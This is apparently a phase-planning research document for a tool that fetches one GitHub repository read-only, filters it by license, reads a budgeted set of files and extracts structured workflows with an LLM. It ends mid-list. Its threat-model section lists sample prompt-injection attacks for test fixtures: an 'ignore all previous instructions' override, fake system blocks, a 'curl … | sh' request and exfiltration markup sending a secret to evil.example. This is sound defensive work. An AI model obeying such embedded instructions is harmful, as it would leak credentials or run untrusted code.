# Phase 2: Safe Single-Repository Extraction — Research

**Researched:** 2026-07-21
**Domain:** GitHub REST read-only fetching, deterministic license/eligibility filtering, budgeted repository reading, OpenAI Responses structured extraction, prompt-injection boundary defense
**Confidence:** HIGH for GitHub/OpenAI official API behavior and Phase 1 integration points (read directly from code); MEDIUM for the proposed Phase 2 decomposition and budget heuristics

## User Constraints

No Phase 2 `CONTEXT.md` exists because the user explicitly chose to skip discuss-phase and plan directly from the approved project artifacts.

The following approved constraints are locked for this phase:

- The run input is one manually specified public GitHub repository. The system pins the exact commit SHA, then applies deterministic filtering and budgeted reading, and returns at most three evidenced `WorkflowSpec`s or a clear filtered/no-workflow conclusion (Phase 2 goal; FILT-01..03, READ-01..06, EXTR-01..04).
- Only GitHub REST reads at the pinned SHA are allowed. No clone, release artifact download, dependency install, build, import, example execution, or any other candidate code execution (`READ-06`).
- Deterministic hard gates — especially license — never reach the LLM. Ambiguous (`NOASSERTION`, missing, multiple/conflicting) licenses are rejected by rules with rule version, observed value, `pass/fail/not_applicable`, and rationale (`FILT-02`, `FILT-03`).
- Reading order is README → `docs/` → `examples/` → package manifests → limited source, with default budgets of 25 files / 5 source files / 128 KiB per file / 512 KiB total / ~40,000 input tokens, early stop, and a structured read record (`READ-02`, `READ-03`, `READ-04`).
- The Extractor uses a no-tools, `store=false`, strict Structured Outputs request; refusal and schema failure are diagnosable structured results (`EXTR-01`, `SEC-01`).
- `WorkflowSpec` is the only semantic trust boundary crossing into downstream phases; after extraction, no full README/docs/source text may flow to Generator/Reviewer/Publisher (`EXTR-04`).
- All Phase 1 constraints remain mandatory: fail-closed side-effect policy, content-addressed ledger, checkpoint/resume, closed sanitized error vocabulary, and no remote writes anywhere in the runtime (`AGENTS.md`, Phase 1 decisions).

## Summary

Phase 2 turns three of the nine spine stages — Scout, Filter, Reader, Extractor — from fixture pass-throughs into real implementations while leaving the other five stages out of scope for this phase. The recommended shape is a **four-stage vertical slice** (SCOUT → FILTER → READER → EXTRACTOR) running on the Phase 1 `PipelineRunner`, with a new `phase2-v1` producer registered alongside `fixture-v1`, a new `RepositorySubject` CLI input, a phase-two composition root whose `SideEffectPolicy` ceiling admits `REMOTE_READ` (never `REMOTE_WRITE`), and two new adapters: a read-only GitHub REST client (`httpx`) and a no-tools OpenAI Responses client (`openai` SDK, `store=false`, strict `text.format`).

Three Phase 1 mechanics make this smaller than it looks:

1. The hash chain already in `StageInput.previous_output_hash` (`src/skillscout/domain/models.py:140`) transitively binds every upstream stage output, so stage identity needs no schema change — Phase 2 only adds a **runtime-only context carrier** so Filter can see Scout's snapshot, Reader can see the filter verdict, and Extractor can see the in-memory read bundle. The raw bundle never enters any durable surface; existing `StagePayload`/`MAX_MANIFEST_BYTES` bounds (`src/skillscout/domain/models.py:27-33`) structurally enforce that.
2. `StageAttempt`/`StageEnvelope` already carry nullable `prompt_version`, `policy_version`, `model_id`, `request_id`, and `TokenUsage` (`src/skillscout/domain/models.py:144-194`), and `stage_output_hash` schema "2" already mixes prompt/policy/model into output identity (`src/skillscout/domain/canonical.py:49-83`). Phase 2 must extend the runner to **populate** these from processor-returned telemetry instead of hardcoding `None` (`src/skillscout/application/pipeline.py:290-296, 357-360`).
3. The firewall vocabulary already contains `EffectScope.REMOTE_READ` (`src/skillscout/domain/enums.py:24-30`); only the policy ceiling (`PHASE_ONE_MAX_SCOPES`, `src/skillscout/application/pipeline.py:55-57`) excludes it. Phase 2 adds a separate `PHASE_TWO_MAX_SCOPES = {NONE, LOCAL_STATE, REMOTE_READ}` and a separate builder — `build_dry_run_runtime` must stay byte-for-byte closed.

**Primary recommendation:** implement four sequential plans — (1) dependency gate for `httpx` + `openai` under the Phase 1 lock-approval convention plus all new frozen contracts (subject, filter, reader, extraction, fingerprint) with zero network code; (2) runner generalization (stage slice, context carrier, telemetry) + GitHub read adapter + Scout/Filter over `httpx.MockTransport` fixtures; (3) budgeted Reader with tier ordering, early stop, and the full rejection matrix; (4) OpenAI extraction adapter, deterministic output boundary validation, prompt-injection corpus, CLI `extract-repo`, and acceptance evidence. Plans are sequential because each refines the contracts and runtime the next one builds on.

## Phase 1 Integration Map

Exact extension points, verified against the current code:

| Phase 2 need | Phase 1 anchor | Required change |
|---|---|---|
| Stage names Scout/Filter/Reader/Extractor | `PipelineStage` StrEnum, `src/skillscout/domain/enums.py:8-17` | None — names already exist in the closed 9-stage vocabulary |
| Run only 4 of 9 stages | `PipelineRunner.run` iterates `enumerate(PipelineStage)`, `src/skillscout/application/pipeline.py:243` | Add a closed `PipelineProfile` mapping producer → ordered stage subset (`phase2-v1` → `(SCOUT, FILTER, READER, EXTRACTOR)`); keep **global** stage indices so `PersistedAttemptRecord` validation (`src/skillscout/domain/models.py:302`) and `validate_stage_successor` stay intact. The subset is derived from `producer_version`, never from operator input |
| Honest terminal status | `RunStatus` + `_RUN_TRANSITIONS`, `src/skillscout/domain/enums.py:33-56` | Add `COMPLETED = "completed"` with transition `RUNNING → COMPLETED`; terminal `PLANNED_NOT_PUBLISHED` stays fixture-only. Persisted validation only requires diagnostics for INTERRUPTED/FAILED (`src/skillscout/domain/models.py:264`), so no DB migration — stage columns are TEXT |
| Per-stage real processors | `StageProcessor` protocol: `process(stage_input) -> Mapping`, `src/skillscout/application/ports.py:104-112` | Extend to `process(stage_input, context) -> StageOutcome`; `context` (runtime-only) carries the validated subject, prior stage payloads, and scratch space for the raw read bundle; `StageOutcome` carries `payload` plus optional `StageTelemetry(prompt_version, policy_version, model_id, request_id, latency_ms, token_usage)`. Bump `FixtureProcessor` to the new signature (ignores context) so one protocol serves both producers |
| Populate attempt/envelope telemetry | Runner hardcodes `prompt_version=None` etc., `src/skillscout/application/pipeline.py:290-296, 357-360` | Runner copies `StageOutcome.telemetry` into the `StageAttempt` and `StageEnvelope`; `stage_output_hash` schema "2" already hashes these fields, so contract schema stays `"2"` |
| New producer registration | `SUPPORTED_PRODUCER_SCHEMAS = {("1","fixture-v1"),("2","fixture-v1")}`, `src/skillscout/domain/models.py:35-37` | Add `("2", "phase2-v1")`. Keeping schema `"2"` avoids touching `PersistedRunRecord.schema_version: Literal["1","2"]` (`src/skillscout/domain/models.py:248`) and all migration machinery |
| Subject input file | `FixtureSubject` + single-descriptor `load_fixture`, `src/skillscout/adapters/fixtures.py:40-123` | New `RepositorySubject` (schema `"1"`: `subject_id` like `repo:owner/name`, `repository` URL — reuse the existing `RepositoryUrl` pattern, optional `ref` defaulting to the repo default branch) + `load_subject` reusing the same descriptor/identity/size-bound pattern. `RunIdentity.fixture_hash` becomes the SHA-256 of the subject descriptor — semantics preserved, no model change |
| Network-read authority | `EffectScope.REMOTE_READ` exists; `PHASE_ONE_MAX_SCOPES` excludes it, `src/skillscout/application/pipeline.py:55-57`; `SideEffectPolicy`, `pipeline.py:113-129` | New `PHASE_TWO_MAX_SCOPES = {NONE, LOCAL_STATE, REMOTE_READ}`, `SideEffectPolicy.phase_two()`, and `build_phase_two_runtime` with the same fail-closed registry pattern as `build_dry_run_runtime` (`pipeline.py:529-574`). `REMOTE_WRITE` remains rejected everywhere; Phase 1 builder untouched |
| Adapter scope declaration | `AdapterRegistration` derives scope from adapter-owned `effect_scope`, `src/skillscout/application/ports.py:81-101` | `GitHubReadClient.effect_scope = REMOTE_READ`; `OpenAIExtractionClient.effect_scope = REMOTE_READ` (a structured extraction call mutates no remote state; writes stay forbidden until Phase 4) |
| Retry of transient remote failures | `RetryPolicy` (3 attempts, transient codes), `src/skillscout/application/pipeline.py:61-73`; `has_permanent_failure`/`retry_attempt_count` in `StateStore` | No change — map GitHub 429/5xx/timeout and OpenAI 429/5xx/timeout to `STAGE_TRANSIENT_FAILURE`; business rejections (bad license, refusal, schema failure) are **succeeded attempts with outcome payloads**, not failures, so resume never re-calls the LLM for a decided rejection |
| Downstream skip after filter rejection | Closed stage ordering | Filter success payload carries `outcome: "accepted" | "rejected"`; Reader/Extractor processors emit deterministic `{"outcome": "skipped", ...}` without any network/LLM call when the prior outcome is a rejection — this is the structural proof that hard gates never reach the LLM (`FILT-03`) |
| Ledger/manifest persistence | `SQLiteStateStore` (`LOCAL_STATE`, `src/skillscout/adapters/state.py:563`), content-addressed manifests per stage | None — reused as-is. Reader/Extractor payloads contain metadata + bounded excerpts only; `MAX_STAGE_STRING_BYTES = 65_536` and `MAX_MANIFEST_BYTES = 262_144` (`src/skillscout/domain/models.py:27-33`) make full-text persistence structurally impossible |
| Error vocabulary | `ErrorCode` + `ERROR_SUMMARIES`, `src/skillscout/application/ports.py:22-59` | Add one code: `INVALID_SUBJECT` ("Subject input was rejected."). All remote failures collapse into existing `STAGE_TRANSIENT_FAILURE`/`STAGE_PERMANENT_FAILURE`/`STAGE_OUTPUT_INVALID`; raw HTTP/SDK exceptions never cross the boundary (Phase 1 pattern) |
| CLI | `build_parser` subcommands, `src/skillscout/cli.py:36-50` | New `extract-repo --subject <path> --state <db> --output <dir> [--fail-after {scout,filter,reader,extractor}]`; final artifact `extraction-summary.json` written through the same locked/atomic/fsync writer pattern as `_write_publication_plan` (`pipeline.py:468-526`) |

What deliberately does **not** change: the 9-stage `PipelineStage` vocabulary, `StageInput`/`StageEnvelope` field sets, schema `"2"` hash preimages, SQLite schema, resume-event ledger, `build_dry_run_runtime`, and every Phase 1 test.

## Project Constraints from `AGENTS.md`

- **安全 / Prompt injection:** untrusted repo text enters only the low-priority untrusted input region, never the developer message; no tools; no secrets in prompts (`SEC-01`).
- **执行边界:** pure read + static analysis; no clone-run, install, or repo script invocation (`READ-06`).
- **确定性优先:** filtering, content limits, budgets, and format checks are deterministic; the LLM only judges semantics.
- **阶段隔离:** versioned stage I/O, independently retryable, no implicit shared state — the Phase 2 context carrier is runtime-only and never persisted.
- **成本:** hard caps on candidates and LLM calls per run — Phase 2 fixes this at 1 repository and 1 LLM call per run.
- **凭据:** GitHub/OpenAI credentials are environment-injected, minimal-privilege, and never written to logs, DB, prompts, or manifests.

## Standard Stack

### Core (already locked)

- Python 3.13, `src/` layout, Pydantic 2.13.4 frozen/strict models, stdlib `sqlite3`, canonical JSON + SHA-256 — unchanged from Phase 1 (`pyproject.toml`).

### New runtime dependencies (must enter through the Phase 1 supply-chain gate)

`pyproject.toml` currently declares **only** `pydantic==2.13.4`; `uv.lock` contains no HTTP or LLM client. Phase 2 needs exactly two additions, both already decided in `.planning/research/STACK.md`:

| Package | Role | Constraint |
|---|---|---|
| `httpx` (pin exact version at plan time) | GitHub REST client | Sync client, timeouts, no auto-follow beyond same-host redirects; built-in `httpx.MockTransport` is the pytest seam — no extra test dependency |
| `openai` (STACK.md baseline: 2.45.x; re-verify exact patch at plan time) | Responses API client | Used only for `responses.parse`/`responses.create` with `store=False` and strict `text.format`; accepts a custom `http_client`, so tests reuse `httpx.MockTransport` and no VCR library is needed |

Explicitly **not** added: `tiktoken` (token budgeting uses a deterministic bytes÷4 estimate; actual usage is recorded from `response.usage`), any GitHub SDK (STACK.md chose direct REST for transparency), any retry/tenacity library (Phase 1 `RetryPolicy` already owns retry), and any VCR/cassette library (MockTransport + repository-owned recorded JSON is deterministic and reviewable).

Because "any byte change to uv.lock invalidates the human-reviewed dependency graph" (STATE.md, Phase 1 Gate B decision), Plan 01 must repeat the two-gate ceremony: non-building lock discovery, human approval of the new pinned graph, and only then install/test.

## Package Legitimacy Audit

| Package | Publisher | Health signals | Risk |
|---|---|---|---|
| `httpx` | encode (Tom Christie) org | Long-standing, documented at python-httpx.org, `MockTransport` is a first-party testing API | Low — pure Python, no build step |
| `openai` | OpenAI (official) | Official SDK; STACK.md already selected Responses API + SDK; stainless-generated with typed response models | Low-Medium — large surface; mitigate by pinning exactly, using only the Responses namespace, and asserting request shape in tests |

Both are registry-only PyPI packages, satisfying the Gate B "no non-registry sources" convention from Phase 1.

## Architecture Patterns

### Pattern 1: Four-stage slice on the nine-stage spine

`PipelineProfile` is a closed constant: `{"fixture-v1": ALL_NINE_STAGES, "phase2-v1": (SCOUT, FILTER, READER, EXTRACTOR)}`. The runner resolves the profile from the processor's `producer_version`, iterates the subset with **global** stage indices, and terminates with the new `RunStatus.COMPLETED`. Resume, retry digests, checkpoint verification, and the resume-event ledger are untouched because stage identity and attempt identity are unchanged. [ASSUMED: project-specific extension of the Phase 1 runner]

### Pattern 2: Scout = pin + snapshot, all reads at SHA

Scout performs at most three GETs: `GET /repos/{owner}/{repo}` (metadata for FILT-01: `private`, `fork`, `archived`, `disabled`, `visibility`, `default_branch`, `license.spdx_id`, `id`), `GET /repos/{owner}/{repo}/commits/{ref}` (pin ref → 40-hex SHA), and `GET /repos/{owner}/{repo}/git/trees/{commit_sha}?recursive=1` (one snapshot of every path with `mode`, `type`, `size`, `sha`). Tree entries identify submodules (`mode 160000`/`type commit`), symlinks (`120000`), and per-file sizes without downloading anything; `truncated=true` (limit: 100,000 entries / 7 MB recursive) is a deterministic business rejection `repository_too_large`. [CITED: https://docs.github.com/en/rest/repos/repos] [CITED: https://docs.github.com/en/rest/git/trees]

After Scout, every URL embeds the pinned SHA — never a floating branch name (`READ-01`). A contract test asserts every recorded request after the pin contains the 40-hex SHA. v1 accepts 40-hex (SHA-1) repositories only; a 64-hex SHA-256 repo is a recorded deterministic rejection. [ASSUMED: v1 scope simplification]

### Pattern 3: Filter as a pure function over the Scout snapshot

`FilterPolicy` (version `filter-policy-v1`) evaluates an ordered closed rule set against Scout's payload — no I/O:

- `repo.public` — fail if `private` or `visibility != "public"`
- `repo.not_archived`, `repo.not_fork`, `repo.has_default_branch`
- `repo.has_readme` — root `README*` present in the tree (case-insensitive allowlist)
- `license.allowlisted` — `license.spdx_id ∈ {MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause}`; `null`/`NOASSERTION`/anything else fails
- `license.single_file` — tree contains at most one root `LICENSE*`/`COPYING*` candidate; multiple files fail as ambiguous
- `license.confirmed_at_sha` — `GET /repos/{owner}/{repo}/license?ref={sha}` agrees with metadata (404 → fail; mismatch → fail). This is the one Filter-owned GET; GitHub's Licensee matches only the repository license file and returns SPDX IDs or `NOASSERTION` [CITED: https://docs.github.com/en/rest/licenses/licenses]

Every rule emits `{rule_id, rule_version, observed, result: pass|fail|not_applicable, rationale}` (`FILT-03`). Any hard failure → Filter payload `outcome: "rejected"` with the full decision list; Reader/Extractor then skip deterministically (no LLM). [ASSUMED: rule decomposition; requirement IDs fixed]

### Pattern 4: Budgeted tiered reader; raw text lives only in memory

`ReaderPolicy` (version `reader-policy-v1`) defaults from `READ-03`: `max_files=25`, `max_source_files=5`, `max_file_bytes=131_072`, `max_total_bytes=524_288`, `max_estimated_input_tokens=40_000` (estimate = ⌈UTF-8 bytes ÷ 4⌉, deterministic, no tokenizer dependency), plus an early-stop soft target (`early_stop_soft_tokens≈24_000`, evaluated only after the examples tier). Tiers in fixed order (`READ-02`): 0 root README → 1 `docs/**` → 2 `examples/**` → 3 package manifests (`pyproject.toml`, `requirements*.txt`, `setup.py/cfg`, `package.json`, `Cargo.toml`, `go.mod`, …) → 4 source (`src/**`, `lib/**`, root `*.py`), depth-capped, path-sorted within tier for determinism.

Per-entry handling from tree metadata + fetched blob (`GET /repos/{owner}/{repo}/git/blobs/{blob_sha}`, base64, size known in advance from the tree so over-budget files are never fetched [CITED: https://docs.github.com/en/rest/git/blobs]):

- **skip + record:** submodule (mode `160000`), symlink (`120000`), path violation (absolute, `..`, empty segment, backslash, NUL/control, >512 chars), non-allowlisted extension, over-budget size
- **fetch → revalidate:** UTF-8 decode + NUL-byte sniff (binary rejection), LFS pointer prefix `version https://git-lfs.github.com/spec/v1` (LFS rejection), archive extensions never allowlisted (`READ-05`)
- The text allowlist is a closed extension set per tier (`.md .rst .txt` everywhere; manifests by exact filename; source only `.py` for v1)

Reader's persisted payload: ordered `files[] {path, tier, blob_sha, size, content_hash(sha256:…), read_order}`, `rejections[] {path, rule, observed}`, budget consumption, `source_code_loaded: bool`, and `stop_reason ∈ {soft_target_reached, budget_exhausted, candidates_exhausted, no_allowlisted_files}` (`READ-04`). Full text goes only into the runtime context for the Extractor. [ASSUMED: budget heuristics and allowlist contents]

### Pattern 5: Strict structured extraction with surfaced telemetry

The Extractor processor builds exactly one Responses request from the in-memory bundle: developer message = versioned instructions only (`extract-prompt-v1`, no repo text); user message = serialized bundle (path, blob SHA, bounded text per file) inside explicit untrusted delimiters. Request: `client.responses.parse(model=<configured>, input=[...], text_format=ExtractorResponse, store=False, max_output_tokens=<cap>)` — no `tools` key, ever. `store=False` is required: Responses otherwise retains application state for 30 days; with `store=false` no application state is kept (30-day abuse-monitoring logs remain regardless — another reason repo text is minimized and secrets never sent). [CITED: https://platform.openai.com/docs/guides/structured-outputs] [CITED: https://platform.openai.com/docs/guides/your-data]

Outcome mapping (`EXTR-01`): parsed + contract-valid → `outcome: "extracted"` (0–3 workflows; 0 = `no_workflow` conclusion with `rejection_reason`); `response.status == "incomplete"` → `outcome: "incomplete"` with `incomplete_details.reason` (`max_output_tokens`/`content_filter`); refusal item → `outcome: "refused"`; parsed but failing Pydantic/boundary validation → `outcome: "schema_failure"` with sanitized diagnostics. All are succeeded attempts (diagnosable, never retried as failures). API 429/5xx/timeout → `STAGE_TRANSIENT_FAILURE` under the existing 3-attempt `RetryPolicy`. Telemetry from `response.id`, `response.model`, `response.usage`, and measured latency lands in `StageAttempt`/`StageEnvelope` via `StageOutcome.telemetry`.

### Pattern 6: Deterministic boundary validation and skillscout-owned fingerprint

The model never emits identity. Post-parse, skillscout deterministically validates every candidate workflow: each `evidence.path` exists in the read record; each `evidence.blob_sha` matches the recorded blob; each excerpt is a verbatim substring of the fetched content and ≤ a policy length (e.g., 280 chars); no text field contains URLs, shell-shaped commands, or secret patterns. Violations → that workflow is dropped with a recorded reason; all dropped → `schema_failure`. Surviving workflows get `fingerprint = sha256("wf-fingerprint-v1" | repo_id | normalize(goal) | normalize(steps))` where `normalize` = NFKC + casefold + punctuation strip + whitespace collapse — stable for identical normalized semantics, computed by us, versioned (`wf-fingerprint-v1`). [CITED: milestone ARCHITECTURE.md fingerprint guidance] [ASSUMED: exact normalization]

### Pattern 7: Phase-two composition root

`build_phase_two_runtime(state, processor, github_client, openai_client)` mirrors Phase 1: closed registry (`phase2_processor`, `sqlite_and_manifests`, `github_read`, `openai_extract`, `clock`, `run_ids`, `extraction_summary_writer`), concrete-type check, `SideEffectPolicy.phase_two()` admitting `{NONE, LOCAL_STATE, REMOTE_READ}`. Credentials are read once at adapter construction (`SKILLSCOUT_GITHUB_TOKEN` optional read-only; `OPENAI_API_KEY`), set as client headers, and never enter domain objects, payloads, logs, or manifests — a canary test proves it. [ASSUMED: env var names]

### Pattern 8: Serial, rate-limit-aware HTTP

GitHub requests are serial (secondary rate limits punish concurrency), with `X-GitHub-Api-Version` pinned, `x-ratelimit-*` headers parsed into the Scout payload for audit, 429/403-with-`remaining: 0` mapped to transient failure (honor `Retry-After`/`x-ratelimit-reset` before the next attempt), 301 followed and recorded (repo renames — identity stays the numeric repo `id`). Unauthenticated is capped at 60 req/hr per IP; an optional read-only token raises this to 5,000/hr — one Phase 2 run costs ≤ ~30 requests, so either works, but tests must not require a token. Conditional requests (ETag → 304 free) are unnecessary at pinned SHAs (content is immutable) and are deferred to Phase 5's 100-candidate scale. [CITED: https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api] [CITED: https://docs.github.com/en/rest/using-the-rest-api/best-practices-for-using-the-rest-api]

## GitHub REST Endpoint Plan (allowlisted)

| Call | Endpoint | Used for |
|---|---|---|
| metadata | `GET /repos/{owner}/{repo}` | FILT-01 observed values, repo `id`, `default_branch`, `license.spdx_id` |
| pin | `GET /repos/{owner}/{repo}/commits/{ref}` | resolve branch/tag → commit SHA (`READ-01`) |
| tree | `GET /repos/{owner}/{repo}/git/trees/{sha}?recursive=1` | Scout snapshot; submodule/symlink/size/path detection |
| license | `GET /repos/{owner}/{repo}/license?ref={sha}` | FILT-02 confirmation + license-file blob SHA |
| blob | `GET /repos/{owner}/{repo}/git/blobs/{blob_sha}` | Reader content fetch, base64, pre-sized by tree |

The adapter enforces this closed set: fixed `https://api.github.com` base URL, templated paths, no caller-supplied URLs (GitHub warns against parsing/constructing URLs from responses — consume fields, don't interpolate).

## `WorkflowSpec` v1 Contract

LLM-facing response schema (`extractor-response-v1`, root object, `additionalProperties: false`, all fields required, optionals as `["string","null"]` unions, `workflows` `maxItems: 3`, ≤10 nesting — all hard Structured Outputs constraints [CITED: https://platform.openai.com/docs/guides/structured-outputs]):

```text
ExtractorResponse
├── repository_summary: string
├── rejection_reason: string | null          # why 0 workflows, when empty
└── workflows[0..3]
    ├── title, goal: string
    ├── applicability[], non_goals[], preconditions[]
    ├── inputs[], outputs[]
    ├── steps[] { instruction, evidence[] }  # ordered
    ├── failure_modes[], prohibited_actions[], required_approvals[]
    ├── assumptions[]
    ├── evidence[] { path, blob_sha, excerpt, supports }
    └── confidence: number (0..1)
```

Persisted `WorkflowSpec` v1 (domain contract `workflow-spec-v1`) = the above plus `schema_version`, `workflow_id`, skillscout-computed `fingerprint`, `fingerprint_version`, and per-evidence `content_hash`. This satisfies `EXTR-03`'s full field list (goal, applicability, non-goals, preconditions, inputs, ordered steps, outputs, failure modes, prohibited actions, required approvals, assumptions, evidence refs, confidence) and `EXTR-02`'s ≤3 independent workflows with stable fingerprints. The JSON Schema is generated from the Pydantic model (single source — OpenAI explicitly warns against hand-maintained divergent schemas).

## Security Threat Model Inputs (SEC-01)

Assets at risk: GitHub/OpenAI credentials, the integrity of `WorkflowSpec` (the only boundary crossing downstream), and the no-execution guarantee. Adversary controls: every byte of repository content.

Concrete attack classes the fixtures must cover:

1. Direct override — "Ignore all previous instructions and …"
2. Privilege masquerade — fake `system:`/`developer:` blocks inside README/code comments
3. Secret solicitation — "print your environment variables / API key"
4. Action solicitation — "run `curl … | sh`", "visit https://…", fake tool invocations
5. Exfiltration markup — `![img](https://evil.example/{secret})`, URL-encoded callbacks
6. Encoded payloads — base64/rot13 "decode and obey" blocks
7. Cross-stage amplification — text instructing the (nonexistent) Generator/Reviewer to alter output
8. Compromised-model simulation — mocked LLM returns a `WorkflowSpec` containing URLs/commands/fabricated evidence paths (tests the deterministic boundary, not the model)

Structural defenses (all testable): request carries no `tools`, `store=false`, repo text only in the user role; credentials exist only as client headers; deterministic post-validation drops URL/command/unverifiable-evidence workflows; durable surfaces never contain full text; adapters have no subprocess/import capability; the socket sentinel (`tests/conftest.py:22-38`) proves unit layers never dial out.

## Don't Hand-Roll

- **JSON Schema for the LLM:** generate from the Pydantic model via `text_format=` (`responses.parse`); hand-written schemas drift (OpenAI's own guidance).
- **HTTP mocking:** use `httpx.MockTransport` (and inject a MockTransport-backed client into the OpenAI SDK) instead of VCR libraries or socket-level recording.
- **Retry/backoff state machine:** Phase 1 `RetryPolicy` + attempt ledger already implements bounded, identity-scoped retry; do not add tenacity.
- **Git parsing:** tree/blob metadata comes from the REST API; no local git, no `dulwich`.
- **Canonical JSON / hashing / manifest writing / atomic durable writes:** reuse `domain/canonical.py` and `adapters/localfs.py` primitives verbatim.

## Common Pitfalls

- **Letting the license question leak to the LLM.** Any `NOASSERTION`/missing/multi-license ambiguity must be a Filter rejection; a skip-outcome test proves the Extractor processor is never invoked. (PITFALLS P1)
- **Fetching before sizing.** The blob endpoint always returns full base64 content; the tree's `size` is the only budget gate — check before fetch, or a 100 MB blob gets downloaded. [CITED: https://docs.github.com/en/rest/git/blobs]
- **Treating filter rejection as a run failure.** Business rejections are succeeded attempts with outcome payloads; only infrastructure errors consume the 3-attempt retry budget (milestone ARCHITECTURE.md state machine).
- **Persisting the read bundle "for debugging."** That breaks `EXTR-04`/OPS-03's spirit and the no-raw-content proof; excerpts + hashes only.
- **Fingerprint by model title.** Titles reword; fingerprints must hash normalized goal/steps with a versioned algorithm, or Phase 5 dedup breaks. (PITFALLS P1)
- **Silent truncation.** Over-budget reading is a structured result with `stop_reason`, never a quiet cut that claims completeness. (PITFALLS P1)
- **Retrying rate limits naively.** Honor `Retry-After`/`x-ratelimit-reset`; continuing while limited risks integration bans. [CITED: https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api]
- **Model/alias drift.** Record the actual `response.model`, pin the configured model, and version the prompt (`extract-prompt-v1`) — otherwise identical inputs yield incomparable results. (PITFALLS P2)
- **Token-estimate overconfidence.** bytes÷4 is a budget heuristic, not billing; actual `response.usage` is the record. (MEDIUM confidence on the ratio; that's why it's only a gate)
- **Schema `anyOf` at root / optional fields.** Structured Outputs rejects non-object roots and non-required fields; keep the response an object with all-required fields and null-unions. [CITED: https://platform.openai.com/docs/guides/structured-outputs]

## Validation Architecture

### Test layers

| Layer | Scope | Target |
|---|---|---:|
| Contract unit tests | `RepositorySubject` strictness/bounds, filter rule table (every rule × pass/fail/not_applicable), reader policy classification (tiers, allowlist, LFS/binary/path), `WorkflowSpec` schema, fingerprint normalization properties | <1 s |
| GitHub adapter tests (`MockTransport`) | pin resolution, tree mode parsing (submodule/symlink), license 404/NOASSERTION, 301 rename, 429/403+`Retry-After`/5xx → transient mapping, response-size caps, URL allowlist, SHA-in-URL invariant after pin | <2 s |
| Reader tests | budget matrix (files/source/bytes/total/tokens ±1), tier order proof, early-stop reasons, full rejection matrix, read-record completeness | <2 s |
| Extractor tests (`MockTransport` OpenAI) | request shape (`store=false`, no `tools`, strict format, repo text only in user role), parsed/refusal/incomplete/schema-failure outcomes, telemetry into `StageAttempt`, boundary validation drops compromised workflows | <3 s |
| Application/pipeline tests | 4-stage slice with global indices, context chaining, skip outcomes after filter rejection (LLM call count 0), resume re-executes no succeeded stage (recorded transport call counts), transient retry ceiling, `COMPLETED` terminal | <3 s |
| CLI tests | `extract-repo` happy path over recorded fixtures, `INVALID_SUBJECT` non-echoing failure, summary artifact durability | <5 s |
| Security tests | injection corpus (8 classes above), canary-secret absence in request bodies/manifests/stdout, socket sentinel on all non-adapter layers, no-subprocess/no-import sweep over adapters, durable-surface sweep for full-text canary | <3 s |

### Required fixtures

- `tests/fixtures/subject/approved.json` — one `repo:…` subject with default ref.
- `tests/fixtures/github/` — recorded MockTransport responses: metadata (MIT), commits pin, recursive tree (with submodule + symlink + oversized + binary + LFS-pointer entries), license at SHA, blobs (README/docs/example/manifest/source), plus variant sets: `archived`, `fork`, `private`, `no_readme`, `license_noassertion`, `license_multiple_files`, `tree_truncated`, `rate_limited` (429 + `Retry-After`), `renamed` (301).
- `tests/fixtures/openai/` — recorded Responses payloads: `parsed_2_workflows`, `parsed_zero_workflows`, `refusal`, `incomplete_max_tokens`, `schema_invalid`, `compromised_url_in_steps`, `compromised_fake_evidence`.
- `tests/fixtures/injection/` — the 8-class adversarial markdown corpus, including a `CANARY_FULL_TEXT_SENTENCE` (must never appear in durable surfaces) and a `CANARY_EVIDENCE_SENTENCE` (must appear as a bounded excerpt).
- Secret canaries: fake `SKILLSCOUT_GITHUB_TOKEN`/`OPENAI_API_KEY` values asserted absent from every emitted/persisted byte.

### Sampling policy

- After every task: run the narrow test file named in the task's `<automated>` verification plus Ruff on touched Python paths, using the exact repository-local uv prefix convention from Phase 1.
- Plan-level: full pytest + Ruff at each plan end. Before Phase 2 verification: full pytest, Ruff, `uv lock --check`, and two CLI demonstrations (happy path to `extraction-summary.json`; `--fail-after reader` then resume to completion with recorded-transport call counts proving no re-fetch of succeeded stages).
- No live network in pytest, ever — the outbound socket sentinel stays on; adapter tests use MockTransport only. Target full feedback < 15 s.
- One live smoke (real GitHub + real OpenAI, token required) is an optional manual demonstration, not a test-suite gate; the suite must pass with zero credentials.

### Nyquist mapping guidance

- `FILT-01` — per-rule table tests with observed values from recorded metadata/tree; negative fixtures for private/archived/fork/no-default-branch/no-README.
- `FILT-02` — allowlist boundary tests (each accepted SPDX; `NOASSERTION`, null, non-listed, multiple license files, license-endpoint 404, metadata/endpoint mismatch).
- `FILT-03` — decision payload contract test: every record has rule id, rule version, observed, `pass|fail|not_applicable`, rationale; policy version present; skip-outcome test proves no LLM call after any hard failure.
- `READ-01` — recorded-transport assertion: after the pin call, every request URL contains the pinned 40-hex SHA; no default-branch ref reappears.
- `READ-02` — tier-order test asserting exact read_order sequence README → docs → examples → manifests → source.
- `READ-03` — ±1 boundary tests on all five budget knobs; policy version recorded; org ceiling constants not overridable per run.
- `READ-04` — early-stop test with soft target; read-record completeness (paths, blob SHAs, content hashes, order, consumption, source_code_loaded, stop_reason closed set).
- `READ-05` — rejection matrix: binary (NUL sniff + UTF-8 fail), archive extension, submodule, LFS pointer, oversized, path traversal (`..`, absolute, backslash, NUL), non-allowlisted extension.
- `READ-06` — static sweep: no `subprocess`/`os.system`/`importlib`/git invocation in adapters; runtime proof: only MockTransport HTTP calls occur; no tempfile execution.
- `EXTR-01` — MockTransport outcomes: parsed/refusal/incomplete/schema-failure each yield diagnosable structured payloads; request has no tools and `store=false`.
- `EXTR-02` — 0-, 1-, 2-, 3-workflow fixtures; >3 model output clamped/rejected; fingerprint property tests (normalization stability, semantic-change sensitivity, order sensitivity).
- `EXTR-03` — `WorkflowSpec` contract test for the full field list; every workflow's goal/steps carry ≥1 verified evidence ref (path + blob SHA + content hash + bounded excerpt) — success criterion 4.
- `EXTR-04` — durable-surface sweep: manifests, SQLite rows, stdout, summary artifact contain no full-text canary; extractor payload contains only bounded excerpts; boundary validation rejects unverifiable evidence.
- `SEC-01` — request-shape assertions (no tools, `store=false`, untrusted text only in user role), secret-canary absence, injection corpus outcomes all contract-valid, compromised-model responses dropped by deterministic validation.

## Planning Recommendations

Use four sequential plans:

